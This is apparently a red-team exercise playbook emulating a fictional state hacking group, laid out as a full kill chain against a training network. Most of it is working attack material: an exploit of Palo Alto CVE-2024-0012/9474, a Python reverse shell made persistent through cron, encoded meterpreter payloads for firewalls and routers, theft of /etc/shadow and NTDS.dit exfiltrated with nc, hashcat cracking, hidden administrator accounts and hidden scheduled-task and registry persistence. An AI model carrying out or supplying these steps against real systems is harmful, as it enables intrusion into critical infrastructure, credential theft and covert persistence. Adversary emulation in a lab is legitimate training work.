# Introduction

Background: Sassy Panda is an Eastonian government affiliated cyber group falling under the Eastonian Cyber Agency (ECA) and comprised of Easton’s most sophisticated capabilities and equipment. Sassy Panda typically focuses on espionage and information gathering and has targeted critical infrastructure in the U.S. including the New England region. Having been active for over 15 years in the computer network exploitation game, the group has emphasized stealth in operations using web shells, living-off-the-land (LOTL) binaries, hands-on-keyboard activities, and stolen credentials.

TTPS:

Enterprise:

Account Discovery: Domain Account, Archive Collected Data: Archive via Utility, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Windows Command Shell, Compromise Infrastructure: Server, Compromise Infrastructure: Botnet, Credentials from Password Stores, Data from Local System, Data Staged, Local Data Staging, Encrypted Channel: Symmetric Cryptography, Exploit Public-Facing Application, Indicator Removal: File Deletion, Indicator Removal: Clear Network Connection History and Configurations, Lateral Tool Transfer, Log Enumeration, Masquerading: Match Legitimate Name or Location, Masquerading: Masquerade File Type, Obtain Capabilities: Tool, OS Credential Dumping: LSASS Memory, OS Credential Dumping: NTDS, Permission Groups Discovery: Local Groups, Permission Groups Discovery: Domain Groups, Process Discovery, Proxy, Internal Proxy, Query Registry, Remote System Discovery, Server Software Component: Web Shell, Software Discovery, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery, System Owner/User Discovery, Valid Accounts: Domain Accounts, Virtualization/Sandbox Evasion: System Checks, Windows Management Instrumentation

## Attack Flow

**SUBJECT TO CHANGE**

- `terran` -> `Djibouti` -> `Palo Alto Firewall` -> `router` -> `Windows DC` -> `OT`
- `orange-firewall(1.33.170.38)` -> `router` ->   `orange-dc(172.20.2.6)` -> `orange-ics(172.20.6.200)`

Target: Palo Alto firewall management interface at XXX.XXX.XXX.XXX
Exploit Used: `PoC.py`
CVE: `CVE-2024-0012` and `CVE-2024-9474`

## *REQUIREMENTS*: [ClickPaste](https://github.com/Collective-Software/ClickPaste)

- download from source file
- to copy and paste information simpler to from your HOST to the VM

## Reminders

- ALWAYS click on the terminal you want to work on

## Phase 0: Initial Setup for Kill Chain

### SSH Config File Update

On your attack box, type in the following command:
```
sudo nano /etc/ssh/ssh_config
```
Then scroll to the very bottom and add the following block:
```
Host *
    HostkeyAlgorithms +ssh-rsa
    PubkeyAcceptedAlgorithms +ssh-rsa
```
Then press `ctrl + O` and `ctrl + x`
This saves your config so that later on when you ssh onto your boxes, you dont have to include extra options with your ssh command.


### SSH Proxy Chain

#### Terran (104.55.222.X) `On your Attack Box`
This will create a Dynamic Tunnel (1080) and static (5555) from the attack box to the redirector.
```bash
ssh -N -R 5555:localhost:22 -L 4444:<DJIBOUTI_BOX>:22 -D 1080 kali@<DJIBOUTI_BOX>
```

#### Djibouti (102.214.90.X)
If you want to go from your djiboiti redirector back to terran at any point, run the following on the djibouti rediredtor:
```bash
ssh -p 5555 localhost   # connect back to Terran
```

#### Terran (104.55.222.X)
Will connect you to the Djibouti redirector.
```bash
ssh -p 4444 localhost   # tunnel to Djibouti
```

### Exploit Setup

0. WORK ON A NEW BOX, NO TERMINALS OPEN
1. Create a new folder on your `attack box` called `Tools`.
   - This will stage all of the required files and scripts, except PoC.py.
     ```bash
     mkdir ~/Tools
     ```
     
2. (VM) click on a terminal and type `wget `
4. (HOST) download `PoC.py` from the github
5. (HOST) Go to PCTE and go to the file management section
6. (HOST) on the page go to `upload file`
7. (HOST) upload `PoC.py`
8. (HOST) then click on `create a link`
9. (HOST) `copy link`
10. (VM) copy the link to your vm in the `commands` Make sure you put this file in /home/kali, this is the only script that won't be in /home/kali/Tools.
11. (VM) enter
12. (VM) mv `weird name it gives you` `PoC.py`
14. (VM) Enter:
    ```bash
    chmod +x PoC.py
    ```

### Persistence Script Setup

1. Perform the following command: `nano pan_os_comm`
2. In nano, copy and paste the below script: **NOTE- BE SURE TO CHANGE THE IP ADDRESS AND PORT IN THE "s.connect(("10.10.100.169", 63842))" LINE TO MATCH THE IP ADDRESS OF YOUR ATTACK MACHINE AND A RANDOM HIGH PORT OF YOUR CHOICE- end note :)** Please remember the random high port you choose as you will have to recall it for use in setting up your initial listener and throwing the export.


```python
#!/usr/bin/env python3

import socket
import subprocess
import os
import pty
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.100.169", 63842))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
pty.spawn("/bin/bash")
```


### Create your netcat (Attack Box)
```bash
nc -lvnp 63842
```

### *Host Your Tools Folder On A Web Server*

1. In the folder where you have created your tools, start a web server on a random high port to host the necessary files for the exploit
   Run the below command to start the web server:

```bash
cd ~/Tools
python3 -m http.server 51855
```

### *Update Your `rockyou.txt` Wordlist For Later Password Cracking*

Through OSINT and recon, we have located a list of compromised passwords from users within this company. Lets update our rockyou.txt password list to perform offline cracking hashes.

1. Locate your `rockyou.txt` file and open using sudo.

```bash
sudo nano /usr/share/wordlists/rockyou.txt
```
`ctrl+O`

copy and paste password list into rockyou.txt using the orange `commands`

`ctrl+X`

#### PASSWORD LIST

```text
Summer2025
JohnDoe123
Password123!
Football@2023
C0ffeeMorn1ng
Ilov3mydog!
ChocolateCake1
BlueSky_2024
P@ssword2024!
Tiger@12345
!LoveCoding4U
Il0vePizza!
$uperman2024
!QAZ@WSX1qaz2wsx
aIpE9Y+7j#5X
tQc5FwHc@B6r
c+K$u#9j5$nB
Y@9K@2Q5@B$H
q2M@xAx+K+r#
c@5U8j+f2R3P
S$tL9W#Pg6rA
w#I9X9mT4#yS
x$JyP9+t2J9#
cA+I+g@6$p$6
P9@X+Wb@N@pG
n8$Qq#JrD8f2
p3Hu8#8W5X@t
z+b#P@4$PrH9
a$Mg5a8z@iW9
p#y#KpJ9B9Jo
fQ7P4tT+yI$V
S#qTcI#i+Z2B
PPa2x7@w9V5L
UXo9VfGk4sH$
KJ+t+d7W+oX4
AS+x8c$4f$H9
f4i#4x9W4M@5
R6F+j8I7+5S8
UVw4eKz$q2p@
j+9@e@sX4@iJ
B7s8tEoB+zG6
w#u+C#m5N$f7
V9$H6X$8r6m8
TVi$Ev#s$8$M
s#4x+F#I#3#3
w+N#C+W2iW#F
s@Da2+9@y8H2
nI6@x6@Da6$6
c@6E@n6Ze3kD
YM5F6Rs#2$Xq
s4A$e4#2n8P9
z6Y$N3H6r+e2
c$J5z3B9BuN$
BF#cG$4m+Qd2
D6a@b7#5K8W+
F+c2qJ@2hKa$
E@2$c8S4Wn+4
K8tG+9b+B6#6
fT7a4#UsT@yZ
y+9w+s@Q7f6a
t$tBb3aF+Br2
Z+9sV5B$q8+K
t+C+Q+wJ#P2g
ZY@j$F9+Ju7b
G8yR2Df+K6e8
oH@R5#Y8t$c@
cC2x@X#a4+7e
MQ#J6N5WiR6B
qT6#iRn+mN2T
v2C8$2cN+Ry$
h9n#N3h5W+3g
D+U8@5d2t2i#
P@G$5i+o+dEf
K3G4vBt+k$x@
Q$3m5$B3A9Ia
S2G#3@i9+2Vq
aW7$4G+SwB@8
A#s+s4U+iV6h
HB3#6yZj3#H$
e#o9#c$M9H3@
w$3h7J+5$3R5
E@m5Q9o3f6f@
Z#2+3Q#tKi5A
F4T8E7PhJmE#
U7#2#U9K2x+3
q#Qd2qX#7#2#
w4G#cI+D+7yY
QHw$Bd8Cu3A9
Z@4d#Fk+9a+9
D3v5Mj4@U$t@
T+M+2A3D+c#W
M5+rKu#3@p4s
FDrSt$u8+u@R
d+L5C$iPo@H#
yVj4T4+Se6Y+
M8@D#D$4#m2G
rB9X7K+3uN@M
Z3F$c8b9Sp#3
mL@n2a3D@pP4
V$7+9YiU+7Q$
CXa9D+r9#U3+
f7+4A@G@6i@H
X2qY$6@Cv9w2
KG+Vs7e5$dF4

```

### Metasploit Payload Setup
Target all Networking Devices and drop a payload that creates a meterpreter session on each of them:
Make the Payload files for each of your machines:
On your attack box, in the same directory where you saved your scripts, run the following Command. This saves the payload to a file called.

Palo Alto - Orange Firewall
``` bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your Attacker Box> LPORT=50180 -e x86/shikata_ga_nai -i 3 -f elf > pan-netflow

```

Vyatta- Orange Edge Router
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ATTACK BOX IP> LPORT=50180 -e x86/shikata_ga_nai -i 3 -f elf > vyosedge-netflow

```


Vyatta- Orange Core Router
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Edge Router connected Interaface (1.33.XXX.1)> LPORT=50180 -e x86/shikata_ga_nai -i 3 -f elf > vyoscore-netflow

```


Vyatta- Orange 1st Floor
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Edge Router connected Interaface (1.33.XXX.1)> LPORT=50180 -e x86/shikata_ga_nai -i 3 -f elf > vyos1fl-netflow

```


Vyatta- Orange 2nd Floor
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<Core Router IP(172.20.XXX.13)> LPORT=50100 -e x64/xor -i 5 -f elf > vyos2fl-netflow

```



Vyatta- Orange OT Router
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<Core Router IP(172.20.XXX.17)> LPORT=50190 x64/xor -i 5 -f elf > vyosot-netflow

```



Palo Alto- Orange OT Palo
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<OT Router IP(172.20.XXX.1)> LPORT=50189 -e x86/shikata_ga_nai -i 3 -f elf > pan-netflow

```


- Now that you are fully set up, move to Phase 1.

## Phase 1: Initial Access via Palo Alto Exploit

### Section 1. Setting Up Listeners

1. Open up your terminal, and if you dont already have 4, go to your terminal preferences and change the settings to start with 4 panes.
2. In one of the terminal panes, set up your initial listener using Netcat to catch the callback shell from the exploit, by running the following command. Be sure to note the port that you are using for this listener, as it will be needed when initiating the exploit.

```bash
cd ~/Tools
nc -lnvp 7837
```

3. In another terminal pane, set up a second listener to catch the beacon once the cron job is set up on the compromised Palo. Use the port provided in the *pan_os_comm* script that was created earlier.
4. Run the following command to start the second listener:


```bash
cd ~/Tools
nc -lnvp 63842
```

### Section 2. Execute the PoC Script

1. In one of the empty terminal panes, execute the PoC.py script to trigger the exploit:

```bash
python PoC.py https://<ip_of_palo_management_interface> <ip_address_of_attack_box> <port_of_initial_listener>
```

3. Watch the initial listener pane to ensure it catches the callback from the exploit.
   If you see the following, you have successfully exploited the Palo Alto and now have a limited bash shell into the root of the system:
   Note: Our listener port will be 7837, as specified earlier in the playbook. Not 9999 as pictured.

![image](https://github.com/user-attachments/assets/0d3b2d49-fe66-4dcb-80da-51204efebfbc)

   If you do not see the following, its time to troubleshoot.

Troubleshooting steps:

   1. Use the correct IP addresses and ports in your listeners and exploit arguments
   2. Ensure there is routing to the Palo Management Interface.
   3. Ensure you copied your exploit script over correctly
   4. Find a Sassy Panda SME and pray they have the answers :-)

## Phase 2: Palo Persistence

- `Ctrl-Z` OR `Ctrl-C` **WILL KILL YOUR SHELL**
- Palo Alto Shell has limited functionality
- **Tab autocompletion and the up/down arrow keys won’t work**
- The first priority is to establish persistence using a cron job and the pan_os_comm script you created earlier.

1. Start by running some basic enumeration commands to get a sense of your current environment on the machine.

   - (response should be "root")

```bash
bash 
pwd
cd ~
ls
```

2. Next, import the scripts from your attack machine, where they are being hosted via the web server.
The following command pulls the files and puts them into the current users home directory.
   ```bash
      wget -r -np -nH --cut-dirs=1 -P ~ http://<IP_of_your_attack_box>:51855/
      chmod +x ./*
   ```
 3. cd to current users home directory: `cd ~`
   make pan_os_comm executable: `chmod +x pan_os_comm`
   move pan_os_comm to /usr/local/bin/: `mv pan_os_comm /usr/local/bin/`

4. To ensure that the file has been successfully downloaded and is executable, run:

```bash
ls -l /usr/local/bin | grep pan_os
```

5. Once you’ve confirmed the script is there, it’s time to set up the cron job to maintain persistence. To add the cron job, execute the following command:

```bash
(crontab -l 2>/dev/null; echo "* * * * * /usr/bin/python3 /usr/local/bin/pan_os_comm >/dev/null 2>&1") | crontab -
```

NOTE- This will add a cron job that runs every minute, calling your pan_os_comm
script and sending a beacon to your second listener.

6. To check that your cron job has been successfully added, run the following:
   ```bash
   crontab -l
   ```
NOTE- This should display the current cron jobs, confirming that the job was added. The cron job will send a beacon to your listener every minute, ensuring that even if you lose access, you can reopen the listener using the same port, and it will catch the beacon again.

## Phase 3: Enumeration and Exfil

Now that we have a way to return to the system, let’s gather critical files containing sensitive data, which can be exfiltrated and reviewed offline for password cracking.

1. We’ll start by viewing some important files and saving them to a new document for exfiltration:

`UTILIZING THE CALL BACK BEACON- NOT THE EXPLOIT SHELL`

```bash
cd ~
cat /etc/passwd > users.txt
cat /etc/shadow >> users.txt  # Notice the '>>', it appends the content of /etc/shadow
cat /etc/hosts >> users.txt   # Append /etc/hosts to the same file
```

NOTE: The `>>` operator ensures that the contents of `/etc/shadow` and `/etc/hosts` are appended to `users.txt`. **If you use** `>`, **the file will be overwritten.**

2. Next, use `SCP` to securely copy the `users.txt` file to your attack machine:

   - On your Kali machine, run the command `systemctl status ssh`.
   - If disabled and inactive, run the following two commands:

```bash
sudo systemctl enable ssh
sudo systemctl start ssh
```

To confirm the service has started, from your Kali machine, run
```bash
systemctl status ssh
```

##Switch users to become root and run the following commands.

```bash
sudo su
```

```bash
echo '' > /root/.ssh/known_hosts
```

From the Palo Alto CLI, run this command to secure copy the `users.txt` file from your Kali box to the Palo machine.
```bash
scp users.txt kali@<your_ip_address>:.
```

type `y`

NOTE: Make sure to replace <your_ip_address> with the actual IP address of your attack machine, and this will drop in your kali home.

4. On your attack machine, open a new terminal, navigate to your home folder, and check if the file has been transferred successfully:

```bash
cd ~
ls | grep users.txt
```

5. Once you’ve confirmed that the file has been successfully transferred, you can exit the compromised machine. Your beacon terminal should still be active, allowing you to regain access at any time.
   `exit`

## Phase 4: Privilege Escalation

In this section, we will leverage the exfiltrated users.txt file that was pulled from the Palo Alto system. We will perform offline password cracking to gain legitimate credentials for the device.

1. First, verify that you’re in the correct directory where users.txt is located. You can search for the file and navigate to it with the following commands:
   ```bash
   find / -name "users.txt"
   ```
   Once you have found the file, change to the directory where it's located (unless you are already there):
   ```bash
   cd /path/to/directory/with/users.txt
   ```
2. Once you are in the correct directory, run the following command to create a new file containing only the valid SHA-256 hashes and usernames from the users.txt file:

```bash
grep -E '^[^:]+:!?\$[156]\$' users.txt | sed 's/:!/:/' > valid_hashes.txt
```

This command filters the content of users.txt and extracts the lines that start with valid SHA-256 hashes ($5$), saving them to a new file called `valid_hashes.txt`.

3. Now that you have the valid hashes in `valid_hashes.txt`, you can begin cracking the passwords offline using Hashcat. Run the following command to start the cracking process with the rockyou.txt wordlist:

```bash
hashcat -m 7400 --username valid_hashes.txt /usr/share/wordlists/rockyou.txt
```

This will use Hashcat to attempt cracking the passwords. The -m 7400 option specifies the SHA-256 crypt format, and the -a 0 option sets the attack mode to dictionary-based.
   -While Hashcat is running, you can check the status of the cracking process by using the following command: `hashcat --status`

4. Once Hashcat has completed the cracking process, you can view the cracked passwords by running:

```bash
hashcat -m 7400 --username valid_hashes.txt --show | cut -d':' -f1,3 > creds.txt
```

```bash
cat creds.txt
```

5. Once the hashes are cracked run a cat on the valid_hashes.txt file to see who the passwords belong to: `cat valid_hashes.txt`

6. Using the cracked administrator credentials, you can now log into the Palo Alto device via SSH:

```bash
ssh admin@<palo alto IP>
```

- When prompted, enter the cracked password. If successful, you should be logged into the Palo Alto device.

![image](https://github.com/user-attachments/assets/66e07739-2790-485b-9154-57c3ca5a34c8)

## Phase 5: Internal Reconnaissance & Enumeration

In this section, we’ll perform network discovery using native PAN-OS commands directly from the compromised Palo Alto device. We’ll focus on gathering network information, such as interfaces, routing tables, and active sessions.

Additionally, we copy all outputs from coommands into a text document on our local machine for later review.

1. Get Network Interfaces and copy them into a text file on your host machine:

```bash
show interface all
```

2. View routing table and copy into same created text file:

```bash
show routing route
```

3. Check arp table:

```bash
show arp all
```


#### Attempt to pivot through firewall if routing/NAT is enabled

- sshuttle/reverse SOCKS proxy (chisel, socat) to tunnel traffic into the internal
network.

## Phase 6: Target Discovery Inside Orange Space

In one of your empty terminals on your attack box 
1. Open metaslpoit console  
`msfconsole`

2. set up your multi handler to catch the palo alto payload
``` 
use exploit/multi/handler  
set PAYLOAD linux/x86/meterpreter/reverse_tcp 
set LHOST <Your_Attacker_IP> 
set LPORT 50189 
set ExitOnSession false
show options (this will let you check to make sure everything is set properly) 
exploit -j`
```


In the terminal that has your beacon shell (palo alto callback)
 ```
 cd ~
 mv pan-netflow /usr/local/bin/pan-netflow
 ```
 cd to where the file is  
`cd /usr/local/bin`

 Run the file and send it to the background so you can continue to use your shell  
`./pan-netflow &` 



Go to your meterpreter screen  
 you should have seen the multi/handler catch the payload

 In your meterpreter session
 
 press `bg`  to background the session
 
 press `jobs` to ensure that the mulit/handler is still running  




 Set up your multi handler to catch the vyatta router payload
 In one of your empty terminals on your attack box 
1. Open metaslpoit console  
`msfconsole`

2. set up your multi handler to catch the palo alto payload 
 ``` 
use exploit/multi/handler  
set PAYLOAD linux/x64/meterpreter/reverse_tcp for the Vyatta  
set LHOST <Your_Attacker_IP>
set LPORT 50189  
set ExitOnSession false
show options (this will let you check to make sure everything is set properly) 
exploit -j
```
3. On our palo alto callback shell 
 scp the payload file from the server and place it in the /usr/local/bin folder on the vyatta router
```
 scp <payload-file> vyatta@<vyatta-router-IP>:/usr/local/bin/
```
 ssh onto the core router 
 ```
 ssh vyatta@1.33.170.6
 ```
 password: simnet
 
 navigate to the directory we sent the file to
 ```
 cd /usr/local/bin
 chmod +x <payload-file>
 ```
4. run the payload
   `./payload-file> &` 

Go to your meterpreter screen  
 you should have seen the multi/handler catch the payload

 In your meterpreter session
 press `bg` 
 press `jobs` to ensure that the mulit/handler is still running 



# router add the router section here

Assuming pivot success to internal hosts:

#### Scan internal subnets for DC or LDAP

```bash
nmap -p 389,445,88,135,139,389,636,3268,3269 -sV -Pn 172.20.0.0/16
```

- Look for the Domain Controller (likely in orange-servers or orange-users).

## Phase 7: Credential Access (via LDAP, SAM/NTDS)

- Once a DC is identified (e.g., 172.20.2.X), you can:
  - `88`, `389`
- Enumerate via LDAP (LOLBAS):

```bash
ldapsearch -x -h 172.20.2.X -b "dc=orange,dc=local"
```

If admin rights are obtained, dump credentials:

1. Use secretsdump from Impacket

```bash
impacket-secretsdump 'orange.local/adminuser:password@172.20.2.X'
```

2. If on host with NTDS.dit access:
Copy ntds.dit and SYSTEM hive for offline cracking

```bash
copy C:\Windows\NTDS\ntds.dit D:\stolen\
reg save hklm\system D:\stolen\system.hiv
```

Transfer those over SMB/certutil:

```bash
certutil -urlcache -f http://<attacker_ip>/nc.exe nc.exe
nc.exe <attacker_ip> 4444 < ntds.dit
nc.exe <attacker_ip> 4445 < system.hiv
```

Then parse locally:

```bash
secretsdump.py -ntds ntds.dit -system system.hiv LOCAL
```

## Phase 8: Lateral Movement and Persistence


```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<your attack IP> LPORT=6342 -f elf > netflow.vyatta
```

Use Admin Shares:

```bash
wmic /node:172.20.0.X process call create "cmd.exe /c whoami"
psexec.py orange.local/adminuser@172.20.0.X
```

### Create a hidden user (LOLBAS)

```bash
net user stealthyUser P@ssw0rd! /add
net localgroup administrators stealthyUser /add
```

### Persist via Scheduled Task or Service

```bash
schtasks /create /tn "Updater" /tr "powershell -NoP -NonI -W Hidden -Enc <payload>" /sc minute /mo 15
```

Or use registry run keys:

```bash
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t 

REG_SZ /d "powershell.exe -WindowStyle Hidden -File C:\Users\Public\rev.ps1"
```

## Phase 9: OT Network Target Prep (Later Stage)
